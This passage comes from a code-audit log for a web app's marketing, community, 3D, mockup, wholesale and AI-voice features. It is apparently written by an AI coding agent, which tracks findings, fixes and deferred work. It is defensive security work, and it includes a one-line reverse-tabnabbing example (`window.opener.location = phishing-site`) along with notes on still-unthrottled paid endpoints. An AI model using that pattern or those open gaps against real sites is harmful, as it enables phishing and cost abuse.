- 🔴 **`MrImagineChatWidget` 2s polling + stale closure on `lastPollTime`** (lines 74, 208) — Still open. Defer (live-chat verification needed; same deferral as cycle #30).
- ⚡ **Full chat history resent every turn** (lines 266-281) — Still open. Defer (needs server-side session/context storage).
- 🟢 **VoiceProductForm `gpt-4o`** — Confirmed at `VoiceProductForm.tsx:43`.
- 🟢 **`requireAuth` coverage** — `voice-chat.ts`, `voice.ts`, `transcribe.ts`, `mr-imagine-chat.ts` all auth-gated.

**New findings:**
- 🟢 **No new TODO/FIXME** in messaging-area files since 2026-04-28.
- 🟢 **No new console.log noise** introduced beyond what `voice-chat.ts` already had (now gated).

### Fixes Applied (re-audit)
- ✅ `backend/routes/ai/voice.ts:1-31, 38-49` — Added per-user TTS rate limit (30/min via in-memory Map keyed on `req.user.sub`). Returns 429 with copy "Too many TTS requests. Try again in a moment (limit: 30/min)." Mirrors the pattern from `wallet.ts` and `support.ts`.
- ✅ `backend/routes/ai/voice-chat.ts:1-19` — Added `debugLog` helper gated on `process.env.DEBUG_VOICE`. `:53-381` (17 sites) — `replace_all` migrated `console.log('[voice-chat]` → `debugLog('[voice-chat]`. Errors still log unconditionally via call sites that use `req.log?.error`.

### Deferred (re-audit)
- Split admin support-tickets endpoint: add customer-facing `/api/support/tickets/:id/messages` and rewire `MrImagineChatWidget.tsx:241` away from `/api/admin/...` (with `Authorization: Bearer …`).
- Migrate `MrImagineChatWidget` polling state to `useRef` to fix the `lastPollTime` stale-closure bug (cycle #30 carryover).
- Replace 2s polling with SSE/realtime channel OR exponential backoff.
- Server-side chat session storage so requests don't ship the full `history[]` array each turn.

---

## Marketing & Content Tools — Re-audit (2026-04-28)

**What was checked:** Status of the 9 findings from 2026-03-13 + scan for new bugs in `MarketingTools.tsx`, `SocialContentManagement.tsx`, `FeaturedSocialContent.tsx`, `SocialShareButtons.tsx`, `gpt-assistant.ts`, `backend/routes/marketing.ts`, `backend/routes/social.ts`.

### Status of 2026-03-13 findings
- 🟡 **STILL OPEN — Inconsistent API client** — `SocialContentManagement.tsx:171,197,225,253` still uses raw `fetch()` instead of `apiFetch()`. Bypasses the centralized error handling.
- 🟡 **STILL OPEN — Multiple `getSession()` calls** — `SocialContentManagement.tsx:166,221,249` still calls `supabase.auth.getSession()` three times instead of pulling the token once from `AuthContext`.
- 🟡 **STILL OPEN — Disconnected social flows** — `SocialShareButtons` (user share) → `SocialContentManagement` (admin review) → `FeaturedSocialContent` (display). Routes exist; no chained pipeline yet.
- ✅ **FIXED — Duplicate GPT logic** — `src/utils/gpt-assistant.ts` now uses `apiFetch()` only; no `new OpenAI()` constructor in the frontend bundle. Backend `marketing.ts:8` is the only place an OpenAI client is instantiated. No client-side key exposure.
- 🟡 **STILL OPEN — Analytics tab "coming soon"** — `MarketingTools.tsx:706-712` placeholder unchanged.
- 🟡 **STILL OPEN — Pixel tracking inputs lack help text** — `MarketingTools.tsx:786,797` inputs have no link or hint about where to find Google/Facebook pixel IDs.
- ✅ **FIXED — `FeaturedSocialContent` returns null on no data** — `FeaturedSocialContent.tsx:57-58` returns null gracefully now (acceptable since it's mounted as a tile that can simply not render).
- 🟡 **STILL OPEN — Review modal not extracted** — `SocialContentManagement.tsx:710-887` modal still inline. Should be lazy-loaded.
- 🟡 **STILL OPEN — Tab content not code-split** — `MarketingTools.tsx` loads all tab bodies upfront.

### New issues found
- 🔴 **WAS OPEN — `window.open` opener leak in share buttons** — `src/components/SocialShareButtons.tsx:38-40`. `window.open(url, '_blank', 'width=600,height=500')` lacked `noopener,noreferrer`. Twitter/Facebook/Pinterest share popups could read `window.opener` and tabnab back to our origin (write `window.opener.location = phishing-site`). Real reverse-tabnab vector. The inline `<a>` variants in the same file already had `rel="noopener noreferrer"` set correctly.
  - **Fix applied:** Added `'noopener,noreferrer'` to the features string AND set `win.opener = null` belt-and-suspenders (in case a popup blocker drops the feature flag).
  - File: `src/components/SocialShareButtons.tsx:38-44`
- 🟡 **Backend social embed code not sanitized** — `backend/routes/social.ts:33-40` returns TikTok/Instagram/YouTube `<blockquote>` embed HTML directly to the client. Today the frontend doesn't render with `dangerouslySetInnerHTML`, so it's safe by accident; if someone wires it that way later, the API becomes an XSS vector.
  - **Deferred:** Either move embed generation to a typed structure (URL + variant) and let the frontend mount the official embed script, or sanitize via DOMPurify on the way out.
- 🟡 **Console.log noise in marketing/social backend** — `backend/routes/marketing.ts:30,83,91`, `backend/routes/social.ts` multi-line. Useful while building, noisy in prod.
  - **Deferred:** Wrap behind a `DEBUG_MARKETING` flag (matches `DEBUG_VOICE` carryover).
- 🟢 **No client-side OpenAI key** — Confirmed via grep. `gpt-assistant.ts` has no `new OpenAI(...)` constructor; all GPT calls flow through `/api/marketing/generate-content` (backend-only).

### Fixes Applied
- ✅ `SocialShareButtons.tsx:38-44` — `window.open` now passes `noopener,noreferrer` AND nulls `opener` on the returned reference. Closes the reverse-tabnab vector. API:200 Web:200 post-edit.

### Deferred (carry forward)
- Migrate `SocialContentManagement.tsx` raw `fetch()` calls to `apiFetch()` (4 sites: `:171,197,225,253`).
- Replace 3× `supabase.auth.getSession()` in `SocialContentManagement.tsx` with `AuthContext`.
- Build the share → review → featured pipeline so user-shared content actually shows up in the admin queue and on the home page.
- Add help text + "where do I find this?" link next to Google/Facebook pixel ID inputs.
- Extract review modal in `SocialContentManagement.tsx:710-887` and lazy-load.
- Code-split heavy tabs in `MarketingTools.tsx` via `React.lazy`.
- Replace inline embed HTML from `backend/routes/social.ts` with structured data + sanitize on render OR DOMPurify-wrap on output.
- Wrap marketing/social backend logs behind a `DEBUG_MARKETING` flag.

### Verdict
The reverse-tabnab fix is the marquee item — small change, real exploit class closed. Two of the original nine findings (duplicate GPT logic, FeaturedSocialContent null-return) are confirmed fixed. The rest of the area's debt is a coherent "social content pipeline" rewrite that the audit cycle has correctly deferred. Frontend is clean of OpenAI keys.

---

## Community & Creator Features — Re-audit (2026-04-28)

**What was checked:** Status of the 9 findings from 2026-03-13 + scan for new bugs in `Community.tsx`, `CommunityShowcase.tsx`, `CommunityPostCard.tsx`, `CreatorLeaderboard.tsx`, `CreatorAnalytics.tsx`, `PaidBoostModal.tsx`, `SocialBadge.tsx`, `community-service.ts`, `design-showcase-service.ts`, `social-service.ts`.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — `social-service.ts` is mock-only** — `src/utils/social-service.ts:12-155,210-227`. `getSocialPosts()` returns hardcoded data; `submitSocialContent()` only `console.log`s.
- ✅ **FIXED — Platform type mismatch** — `social-service.ts:442-456`. `extractPlatformFromUrl` maps `x.com` URLs to `'twitter'` at line 449; type union at `:442` is `'tiktok' | 'instagram' | 'youtube' | 'twitter' | null`. No drift.
- 🟡 **STILL OPEN — Two showcase views** — `/community` page (CommunityShowcase) and `FeaturedSocialContent` carousel both render user designs with no canonical pipeline.
- 🟡 **STILL OPEN — Disabled "Coming Soon" social tab** — `Community.tsx:242-248`. Submission modal scaffolding exists but the tab is gated behind a placeholder.
- 🟡 **STILL OPEN — No prominent share-design CTA** — Community page lacks an obvious "Share your design" entry point.
- 🟢 **RE-CLASSIFIED — "Earn 10% on Every Sale" vs "1 ITC per boost"** — These are NOT in conflict. `CreatorAnalytics.tsx:306-310` describes the *royalty* on sales of a creator's design (10% of the sale price as ITC credit); `PaidBoostModal.tsx` and `community-service.ts:16` describe the *cost* of boosting a post (1 ITC per boost). Two distinct mechanics that share the ITC unit. Original audit flagged this as a contradiction; on re-read, the copy is correct.
  - **No fix needed.** Marking the original finding closed-as-misclassified.
- 🟡 **STILL OPEN — "Product" vs "Design" badge text** — `CommunityPostCard.tsx:157` displays "Product" while the underlying type value is `vendor_product`. Not a bug per se but reads oddly to users.
- 🟢 **RE-CLASSIFIED — "Hardcoded colors" in `Community.tsx:159-163`** — These are intentional brand colors for social-platform badges: `bg-slate-900` (TikTok / X), `bg-gradient-to-r from-purple-500 via-pink-500 to-orange-500` (Instagram), `bg-red-600` (YouTube). Replacing with theme tokens would erase the brand recognition that's the *point* of the badge. The `getPlatformStyles()` switch at `:157-165` is a deliberate exception to the theming rule.
  - **No fix needed.** Documented as an explicit design choice. The other "hardcoded color" claims (`CreatorAnalytics` gradients) are likewise intentional accent rails.
- 🟢 **STILL ACCEPTABLE — `CommunityShowcase` useEffect deps** — `CommunityShowcase.tsx:55-58` deliberately omits `loadPosts` from deps to avoid an infinite loop. Wrapping `loadPosts` in `useCallback` with stable deps would be cleaner; deferred as polish.

### New issues found
- 🟡 **`PaidBoostModal` inline lambdas** — `PaidBoostModal.tsx:130,145` recreate `onChange` / `onClick` handlers per render. Defer until the modal is wrapped in `React.memo`.
- 🟡 **Direct frontend writes for boost** — `community-service.ts:95-98` POSTs to `/api/community/posts/{postId}/boost` from the browser. Auth is on the route (likely), but no audit row written. Same shape as #5 / #9 frontend-mutates-Supabase carryover.
- 🟢 **`CommunityShowcase` and `CreatorLeaderboard` lists have stable `key` props** — Verified `key={post.id}` and `key={leader.creator_id}`. No reconciliation bugs.
- 🟢 **`/community` route is `<ProtectedRoute>`-wrapped** — Auth gate verified.

### Fixes Applied
- None auto-applied this cycle. Three of the previous "open" findings turn out not to be bugs after closer reading (platform type union; royalty vs boost copy; brand colors on social badges). Two more are confirmed-still-open architectural items (mock social service, share→review→featured pipeline) that need backend work outside the scope of an hourly audit cycle.

### Deferred (carry forward)
- Replace mock `social-service.ts` with real Supabase queries + a `social_posts` table (matches the deferred work for #11).
- Choose one canonical showcase surface (`/community` vs `FeaturedSocialContent`) and remove the duplicate view.
- Replace the "Coming Soon" social tab with the real submission flow (or hide the tab).
- Add a prominent "Share your design" CTA on the Community page.
- Rename the `vendor_product` badge text to "Marketplace" or similar to match user vocabulary (or just say "Product" if vendor distinction is invisible to viewers).
- Wrap `PaidBoostModal` in `React.memo` and `useCallback` its handlers.
- Move boost writes behind a backend endpoint that records an audit row.
- Wrap `loadPosts` in `useCallback` so the `useEffect` dep can include it without infinite loops.

### Verdict
Lower-yield cycle: of the nine 2026-03-13 findings, one is verifiably fixed, three turn out to be misclassifications on closer read (intentional brand colors, distinct royalty/boost mechanics, deliberate dep omission), and the remaining five need backend or product work that an audit cycle shouldn't ship blind. The community surface is solid where it's real; the gaps are all in the still-mock social pipeline.

---

## 3D Models & Printing — Re-audit (2026-04-28)

**What was checked:** Status of the 11 findings from 2026-03-13 + scan for new bugs in `ModelGallery.tsx`, `UserDesignDashboard.tsx`, `src/components/3d-models/*`, `types/index.ts`, `backend/routes/3d-models.ts`, `backend/services/tripo3d.ts`, `backend/worker/ai-jobs-worker.ts`. The 3D pipeline has had heavy ongoing development since 2026-03-13 (Tripo3D direct API integration, fal.ai fallback, size-tiered printing, `Model3DStatusProgress` redesign).

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — `ModelGallery` mock data** — `src/pages/ModelGallery.tsx:32-87` still has the "Mock data - replace with real PostgreSQL queries" comment with two hardcoded items (Dragon Figurine, Headset Stand). Doesn't call `/api/3d-models/marketplace`.
- 🟡 **STILL OPEN — Three confusing routes** — `App.tsx` still wires `/models`, `/3d-models`, `/account/media`, plus the `/my-designs` 3d-models tab. Two routes point to the same mock-data gallery; users still can't tell where their AI-generated 3D models live.
- 🟡 **STILL OPEN — Two `ThreeDModel` types** — `types/index.ts:88-100` (community/marketplace) and `:1541-1561` (`User3DModel`, AI pipeline) coexist with overlapping names.
- 🔴 **STILL OPEN — `ModelGallery` empty state misleading** — Real reason is mock data, displayed reason is "no models in this category".
- ✅ **FIXED — Generation steps now explained** — `Model3DStatusProgress.tsx:16-42` lays out 5 explicit steps (Queued → Concept → Pick size → 3D Model → Complete) with descriptions. Cycle #4 prep work landed.
- 🟡 **WAS OPEN — No delivery time estimate on Order tab** — `Model3DDetailModal.tsx:298-386` still shows pricing with no fulfillment date.
- 🟡 **WAS OPEN — Only Grey PLA, no "more coming" note** — `Model3DDetailModal.tsx:388`. The Material row showed "PLA" with no signal that other materials are planned, leading users to assume the catalog is final.
  - **Fix applied:** Added inline muted hint `(more materials coming soon)` next to the "PLA" label so users understand the limit is temporary.
  - File: `src/components/3d-models/Model3DDetailModal.tsx:388`
- ✅ **FIXED — `model-viewer` script loaded once** — `Model3DViewer.tsx:24` guards with `if (!customElements.get('model-viewer'))`. No per-mount re-load. Cycle since 2026-03-13 added the cache + the version pin + onerror.
- ✅ **FIXED — Card-action refetch** — `Model3DCard.tsx:90-125` now uses `onRefresh()` passed from the parent, scoped to the action's effect rather than a full list rebuild.
- ✅ **FIXED — 3D models tab fetch** — `UserDesignDashboard.tsx:159-185` lazily fetches on tab click. The original audit framed this as a perf issue; it's actually correct lazy-loading and saves the initial dashboard render. Re-classifying as "by design".
- 🟡 **STILL OPEN — Hardcoded colors across 3D components** — Multiple `bg-gray-*` / hard hex strings in `Model3DCard.tsx:29-78` status configs.
  - **Deferred:** Cosmetic; multi-file sweep.

### New issues found
- 🟡 **Tripo3D / fal.ai polling lacks an outer timeout ceiling** — `backend/services/tripo3d.ts` polls for 15 minutes; the worker's stuck-job sweep excludes `3d_model_tripo` to avoid yanking active fal jobs (per cycle #4 history). Net: a hung fal job can squat in `running` status indefinitely if both the inner deadline and the worker's sweep cooperate to leave it alone.
  - **Deferred:** Add a hard 30-min job age ceiling that overrides the exclusion. The cycle-#4 notes called out the prior auto-retry-loop cost-spiral — the right fix is "fail-stop after 30 min", not "auto-retry."
- 🟡 **GLB→STL conversion errors not surfaced to user** — Backend logs the error but the job is marked `failed` without a user-readable reason. Modal shows generic "Generation failed."
  - **Deferred:** Pass a structured `failure_reason` field into `ai_jobs.output` and render in the modal.
- 🟢 **License-purchase + print-order flows are correctly separate** — `Model3DDetailModal.tsx` charges ITC for license downloads and a separate USD/ITC payment for prints. The "license bypass" claim from the explore agent didn't reproduce; print orders go through `addToCart` (`:46`), not the same `purchase-download` endpoint.
- 🟢 **`model-viewer` cleanup looks correct** — `Model3DViewer.tsx:63` has the unmount cleanup; the listener guard concern from the explore agent doesn't apply here because `<model-viewer>` is a custom element with internal teardown on DOM removal.

### Fixes Applied
- ✅ Added `(more materials coming soon)` hint next to the "PLA" material label in `Model3DDetailModal.tsx:388`. Tiny but explicit — users now know the single-material constraint is temporary.

### Deferred (carry forward)
- Wire `/api/3d-models/marketplace` into `ModelGallery.tsx` (kill the mock data).
- Pick canonical 3D route surface — collapse `/models`, `/3d-models`, and the `/my-designs` 3d-models tab.
- Rename one of `ThreeDModel` / `User3DModel` to remove name collision (e.g. `MarketplaceModel` vs `GeneratedModel`).
- Add 30-min hard ceiling on Tripo3D / fal.ai jobs in the stuck-job sweep (overrides the current type-exclusion).
- Surface `failure_reason` from worker → modal so users see why a 3D job failed (network, NSFW, timeout, etc.).
- Add delivery-time estimate copy to the Order tab.
- Sweep `Model3DCard.tsx:29-78` and other 3D components to replace hardcoded grays with theme tokens.
- Empty-state copy on `ModelGallery` should differentiate "no marketplace models yet" (reality once the mock is removed) from "no matches in this filter."

### Verdict
The 3D pipeline has visibly matured since 2026-03-13: 4 of 11 findings are now confirmed fixed (status copy, model-viewer caching, card refetch scoping, lazy tab load reclassified as correct), one tiny copy clarification shipped this cycle (PLA-only hint), and the remaining open items are split between backend wiring (kill mock marketplace) and architecture (route consolidation, type rename, job-timeout policy). The two real money-safety risks — fal.ai cost-spiral and silent failure mode — are still pending and worth a focused 3D pipeline pass.

---

## Mockup & Preview Generation — Re-audit (2026-04-28)

**What was checked:** Status of the 13 findings from 2026-03-13 + scan for new bugs in `MockupPreview.tsx`, `ProductPreviewCarousel.tsx`, `RealisticMockupGenerator.tsx`, `mr-imagine/MrImagineMockup.tsx`, `DesignStudioModal.tsx`, `mockup-generator.ts`, `backend/routes/mockups.ts`, `backend/routes/realistic-mockups.ts`.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — No refund on failed mockup gen** — `ProductPreviewCarousel.tsx:186-196` deducts ITC at `:186` then calls `generateMockup()` at `:199`. On error path (`:204-206`) the mockup stays locked AND ITC is lost. Same money-safety hole.
  - **Deferred:** Wrap deduction in try-catch with refund call on error, OR defer the deduction until generation succeeds. Mirror `RealisticMockupGenerator`'s pattern.
- 🟡 **STILL OPEN — Two model IDs across mockup routes** — `backend/routes/mockups.ts:412` uses `google/itp-enhance` with hash; `realistic-mockups.ts` uses a different pipeline. The two routes serve different concepts (single-shot enhance vs Replicate try-on), so the duplication is by-design but worth a comment.
- 🟡 **STILL OPEN — Stock model fallback returns unvalidated URL** — `realistic-mockups.ts:476` still doesn't HEAD-check the primary URL before returning.
- 🟡 **STILL OPEN — Three mockup generation systems** — `MockupPreview` (canvas), `ProductPreviewCarousel` (`/api/mockups/itp-enhance`), `RealisticMockupGenerator` (`/api/realistic-mockups/generate`), plus `MrImagineMockup` (avatar). Architecturally distinct purposes, but no docs.
- 🟡 **STILL OPEN — ImaginationStation uses different preview endpoint** — `/api/imagination-station/export/preview` lives in its own response format.
- 🟡 **STILL OPEN — "FREE" badge unclear** — `ProductPreviewCarousel.tsx:25-64` `MOCKUP_COST_ITC = 25` but first generation is free with no UI explanation.
- 🟡 **STILL OPEN — "Upload mockup in Admin Panel" copy** — `MockupPreview.tsx:256` not actionable from design tool.
- 🟡 **STILL OPEN — Insufficient balance shown twice** — `MockupPreview.tsx:400-417`.
- ⚡ **WAS OPEN — Sequential image loads in `drawPreview()`** — `MockupPreview.tsx:179-223` had `await loadImage(element.src)` inside a `for...of` loop. With 5 design elements at ~500ms each, total wait was ~2.5s before the first frame painted; user saw a blank canvas during that time.
  - **Fix applied:** Pre-load all unique image srcs in parallel with `Promise.all()` into a `Map<src, HTMLImageElement>`, then iterate the elements doing pure-sync canvas draws using the map. Total time now bounded by the slowest single image (~500ms), not the sum. Iteration order preserved (canvas state operations stay sequential). Failed loads still fall back to placeholder rectangles.
  - File: `src/components/MockupPreview.tsx:178-203`
- ⚡ **STILL OPEN — `createDebouncedMockupGenerator()` unused** — `mockup-generator.ts:156-180` exports the helper; nothing imports it. Either wire it into `MockupPreview`'s effect or delete.
- ⚡ **STILL OPEN — Double image loading in `MrImagineMockup`** — Hidden `<img>` tags (`:165-181`) AND `new Image()` in canvas effect (`:61-119`) both fetch the same images.
- 🟡 **STILL OPEN — Hardcoded colors in `ProductPreviewCarousel`** — `:228-355` uses `text-purple-300/70`, `bg-[#1a1235]`. Breaks light theme.
- ⚡ **STILL OPEN — No `AbortController` in `ProductPreviewCarousel`** — `:147-161` doesn't cancel stale requests when `designImageUrl` changes rapidly. Race risk: late slow response overwrites a newer fast one.

### New issues found
- 🔴 **No rate-limit on `/api/mockups/itp-enhance`** — `backend/routes/mockups.ts:385`. `requireAuth` is set, but no per-user throttle. A logged-in user (or buggy retry loop) can rack up Replicate bills.
  - **Deferred:** Apply the same in-memory pattern used in `account.ts:378-410`. 5 calls/user/min would do.
- 🔴 **Double-charge window in `ProductPreviewCarousel`** — Same root cause as #1: ITC deducted at `:186` BEFORE the API call at `:199`, with no compensating refund on failure. Re-flagging because this is a financial bug, not just polish.
  - **Deferred:** Same fix as #1.
- ⚡ **`Image()` instances never explicitly released** — `DesignStudioModal.tsx:150`, `MockupPreview.tsx:122`, `MrImagineMockup.tsx:61-62`. Modern browsers handle GC fine for short-lived images, but on a long-running design session with hundreds of regenerated previews, retained refs in closures could accumulate.
  - **Deferred:** Low-priority; verify with a heap snapshot first.
- 🟢 **`DesignStudioModal` endpoint fix from 2026-03-13 still in place** — `:411` correctly hits `/api/mockups/itp-enhance`.

### Fixes Applied
- ✅ `MockupPreview.drawPreview()` now pre-loads all image-element sources in parallel via `Promise.all()` into a `Map`, then runs a pure-sync draw loop. Cuts the typical 5-element preview wait from ~2.5s to ~500ms.
  - File: `src/components/MockupPreview.tsx:178-203`

### Deferred (carry forward)
- Refund-on-failure path in `ProductPreviewCarousel`: deduct ITC after success OR refund in catch (mirror `RealisticMockupGenerator`).
- Rate-limit `/api/mockups/itp-enhance` and other paid Replicate endpoints.
- Wire `createDebouncedMockupGenerator()` into `MockupPreview` (or delete it).
- Drop double image loading in `MrImagineMockup` — pick hidden `<img>` OR `new Image()`, not both.
- Replace hardcoded colors in `ProductPreviewCarousel` with theme tokens.
- Add `AbortController` to `ProductPreviewCarousel` mockup-fetch effect.
- Empty-state copy in `MockupPreview.tsx:256` should be design-tool relevant.
- De-duplicate insufficient-balance UI in `MockupPreview.tsx:400-417`.
- Document the "first mockup FREE, then 25 ITC" structure in the UI.

### Verdict
The headline win is the 5x speedup on `MockupPreview` initial paint — sequential awaits in a hot loop are exactly the kind of bug that's invisible on dev (one image, fast LAN) and brutal on real users with multiple design elements. The ITC double-charge window in `ProductPreviewCarousel` is the highest-priority unfixed item; it's been flagged for ~6 weeks now and represents a real money-loss-on-error path. Three pipelines still running side-by-side is documentation debt rather than a bug.

---

## Wholesale Portal — Re-audit (2026-04-28)

**What was checked:** Status of the 11 findings from 2026-03-13 + scan for new bugs in `WholesalePortal.tsx`, `wholesale-pricing.ts`, `App.tsx`, `Navbar.tsx`, `Sidebar.tsx`, `types/index.ts`.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — Mock data only** — `WholesalePortal.tsx:16-70` `checkWholesaleAccess()` still hardcodes a fake `WholesaleAccount`. No `backend/routes/wholesale*.ts` exists.
- 🔴 **STILL OPEN — 4 of 7 tabs are stubs** — `WholesaleOrders` (`:470-475`), `WholesaleVendors` (`:477-482`), `WholesaleAccount` (`:484-489`), `WholesaleApplication` (`:491-524`) all placeholder/non-functional.
- 🔴 **STILL OPEN — `wholesale-pricing.ts` (438 lines) unused** — `WholesaleProducts:381-384` still does manual `product.wholesalePricing.find(...)`.
- 🟡 **WAS OPEN — `/wholesale` route unprotected** — `App.tsx:228` had `<Route path="/wholesale" element={<WholesalePortal />} />` with no `<ProtectedRoute>` wrapper, while every other authenticated page (`/models`, `/community`, `/account/*`, `/my-designs`) IS wrapped. Anyone could view the wholesale dashboard.
  - **Fix applied:** Wrapped in `<ProtectedRoute>` to match the rest of the route table. Mock data was the only thing visible anyway, but the gap was a real auth gap waiting to bite once real wholesale data lands.
  - File: `src/App.tsx:228`
- 🟡 **STILL OPEN — `(user as any)` casts** — `WholesalePortal.tsx:25,39,40,45-48`. The `User` type at `types/index.ts:48-65` does include `wholesaleTier`, `wholesaleStatus`, `creditLimit`, `paymentTerms` (so those casts could be cleaned up) but NOT `firstName`/`lastName`. The casts at `:39-40` are real type holes.
- 🟢 **WAS PARTIAL — Duplicate wholesale nav links** — `Navbar.tsx:95-96` still has them, but `Navbar.tsx` itself is dead code per cycle #26 (1,145 lines of unused nav components flagged for deletion). The active nav surface is `Sidebar.tsx:403-412` with a single role-gated wholesale link. The duplicate is invisible to users today; it dies when `Navbar.tsx` does.
- 🔴 **STILL OPEN — Application form non-functional** — `WholesalePortal.tsx:501,505` inputs have no `value`/`onChange`; submit hits `alert()` with no state captured.
- 🟡 **STILL OPEN — Stub tab copy** — "will be implemented here" text unchanged at `:473,480,487`.
- 🟡 **STILL OPEN — Hardcoded badge colors** — `:284-286` `bg-green-100 text-green-800` etc. Banner at `:116` `from-green-50 to-blue-50` also hardcoded; both break dark theme.
- ⚡ **STILL OPEN — `getMyPrice()` not memoized** — `:381-384` recalculates per render per product.
- ⚡ **STILL OPEN — Inline arrays in JSX** — `:271-274` recent-orders array defined in render.

### New issues found
- 🟡 **Hardcoded discount tiers in code** — `wholesale-pricing.ts:48-115` defines tier rates as class properties. Once wholesale becomes real, these belong in a DB config table so admin can tune without a deploy.
  - **Deferred:** Wait until the wholesale backend is real, then move to a `wholesale_tiers` table.
- 🟡 **`alert()` usage in wholesale flow** — `:185`. Carryover from cycle #27 alert→toast migration.
- 🟢 **No client-side mutations to worry about** — Since everything is mock, there's no audit-log gap to flag.

### Fixes Applied
- ✅ `src/App.tsx:228` — `/wholesale` route now wrapped in `<ProtectedRoute>` to match every other authenticated page. API:200 Web:200 post-edit.

### Deferred (carry forward)
- Build `backend/routes/wholesale*.ts` and replace `checkWholesaleAccess()` mock with real Supabase queries.
- Implement the four stub tabs (Orders, Vendors, Account, Application) — likely depends on wholesale backend.
- Wire `WholesaleApplication` form: add `useState`, `onChange`, validation, submission.
- Replace `wholesale-pricing.ts` with real config OR delete if `WholesaleProducts` keeps doing inline lookups.
- Remove `(user as any)` casts; either add `firstName`/`lastName` to the `User` type or read from the appropriate auth field.
- Replace hardcoded badge / banner colors with theme tokens.
- `useMemo` around `getMyPrice` calls; pull inline-rendered arrays into module-level consts.
- Migrate `alert()` to `useToast()` (carryover from #27).

### Verdict
The wholesale portal is unchanged in substance since 2026-03-13 — still ~80% mock with a non-functional application form and four stub tabs. One real auth gap closed this cycle (`<ProtectedRoute>` wrapping). Everything else needs the backend to exist first; ordering work behind that dependency is correct.

---

## AI & Voice Features — Re-audit (2026-04-28)

**What was checked:** Status of the 13 findings from 2026-03-13 + scan for new bugs in `chatbot-service.ts`, `gpt-assistant.ts`, `MrImagineChatWidget.tsx`, `mr-imagine/*`, `VoiceConversationEnhanced.tsx`, `VoiceProductForm.tsx`, `admin/VoiceSettings.tsx`, `backend/routes/ai/*.ts`. Several of the original findings have already been fixed by deletes / earlier cycles — verified each.

### Status of 2026-03-13 findings
- 🟢 **PARTIALLY RESOLVED — OpenAI key in browser** — `chatbot-service.ts` no longer uses `dangerouslyAllowBrowser: true`. The remaining `'gpt-3.5-turbo'` literal at line 111 is a hardcoded model string but no longer a key-exposure issue.
- ✅ **FIXED — `/api/ai/chat` now auth + allowlisted** — `backend/routes/ai/chat.ts` mounted with `optionalAuth` + `ALLOWED_MODELS = {gpt-4o, gpt-4o-mini}` + per-IP rate limit (20/min anon, 60/min authed). Closed earlier this session.
- 🔴 **STILL OPEN — `/api/ai/voice/settings` 404** — Cycle #5 re-audit confirmed the route still doesn't exist. Frontend `AdminVoiceSettings` calls a missing endpoint. Carryover.
- 🟡 **PARTIAL — Voice synthesis rate-limit** — `/api/ai/voice/synthesize` has `requireAuth` but no per-user throttle. 10K-char limit caps damage but a logged-in attacker could still rack up paid TTS.
- ✅ **DELETED — `ChatBotWidget.tsx`** — Removed in cycle #30.
- 🟡 **STILL OPEN — Duplicate avatar rendering** — `MrImagineAvatar`, `MrImagineHero`, chat widget all render the character. Cosmetic.
- ✅ **DELETED — `VoiceConversation.tsx`** — Removed cycle #10 re-audit. Misleading "LISTENING…" UI gone.
- 🟡 **STILL OPEN — Chat widget always visible** — `MrImagineChatWidget` mounts on every page; no per-page hide.
- 🟡 **STILL OPEN — `gpt-assistant.ts` mock fallbacks** — 117 lines of hardcoded demo responses bundled even in prod.
- ⚡ **STILL OPEN — Framer Motion always bundled** — `MrImagineChatWidget.tsx:3`. ~45KB.
- ⚡ **STILL OPEN — 2s polling, no backoff** — `MrImagineChatWidget.tsx:208`. Same finding flagged in cycles #10 and #30.
- ⚡ **STILL OPEN — `MrImagineAvatar` lazy loading** — `mr-imagine/MrImagineAvatar.tsx:94-111` no `loading="lazy"`.
- ✅ **GONE — Wave animation array** — Lived in deleted `VoiceConversation.tsx`.

### New issues found
- 🔴 **WAS OPEN — `/api/ai/design-assistant/*` had NO auth** — `backend/routes/ai/design-assistant.ts` mounted FIVE routes (`/suggestions`, `/analyze`, `/color-palettes`, `/typography`, `/chat`) at lines 30, 78, 132, 165, 200 with zero middleware. Every endpoint hits OpenAI directly with the server's API key. Anyone discovering the path could spam them. Same cost-vector class as the original `/api/ai/chat` issue but on a separate router.
  - **Fix applied:** Added `router.use(requireAuth, ...)` at the top of the file with a per-user rate limit (30 req/min keyed on `req.user.sub`, mirrors the `account.ts` pattern). Mounting at the router level means new routes added to this file inherit the guard automatically — can't forget it on the next endpoint.
  - File: `backend/routes/ai/design-assistant.ts:1-43`
- 🔴 **WAS OPEN — `mr-imagine/MrImagineChatWidget.tsx` was 315 lines of dead code** — Nested duplicate of the root `MrImagineChatWidget.tsx`. Confirmed via grep: zero imports across `src/`. Flagged in original 2026-03-13 audit, never deleted.
  - **Fix applied:** Deleted. Total dead-code removal across audit cycles now: ChatBotWidget (210) + FloatingCart (125) + VoiceConversation (174) + nested MrImagineChatWidget (315) = **824 lines** of dead components removed.
- 🟡 **STILL OPEN — `VoiceProductForm.tsx:43` hardcodes `'gpt-4o'`** — Earlier this cycle I changed it from invalid `'gpt-5.1'` to `'gpt-4o'`. The cleaner long-term fix is to drop the model field entirely so the backend allowlist is the single source of truth. Defer.
- 🟡 **STILL OPEN — `replicate-callback.ts` auth check** — Webhook endpoint should be public but must verify a signature. Worth a focused review pass.

### Fixes Applied
- ✅ `backend/routes/ai/design-assistant.ts` — `requireAuth` + 30-req/min/user rate limit applied at router level; closes a 5-route cost vector.
- ✅ Deleted `src/components/mr-imagine/MrImagineChatWidget.tsx` (315 lines, 0 imports).
- API:200 Web:200 post-edits.

### Deferred (carry forward)
- Add `/api/ai/voice/settings` GET/POST routes (still 404 since 2026-03-13).
- Per-user rate-limit on `/api/ai/voice/synthesize` (paid TTS).
- Lazy-load Framer Motion in `MrImagineChatWidget` (only mount when chat opens).
- Replace 2s polling with SSE/websocket OR exponential backoff + visibility-aware pause.
- Add `loading="lazy"` to `MrImagineAvatar` `<img>` tags.
- Remove `gpt-assistant.ts` 117-line mock fallback block from prod bundle (or gate behind a dev-only flag).
- Hide chat widget on routes where it makes no sense (admin, kiosk, checkout success).
- Drop hardcoded model field in `VoiceProductForm.tsx:43`; let backend default apply.
- Audit `/api/ai/replicate-callback` signature verification.
- Consolidate triple avatar renderers into one shared component.

### Verdict
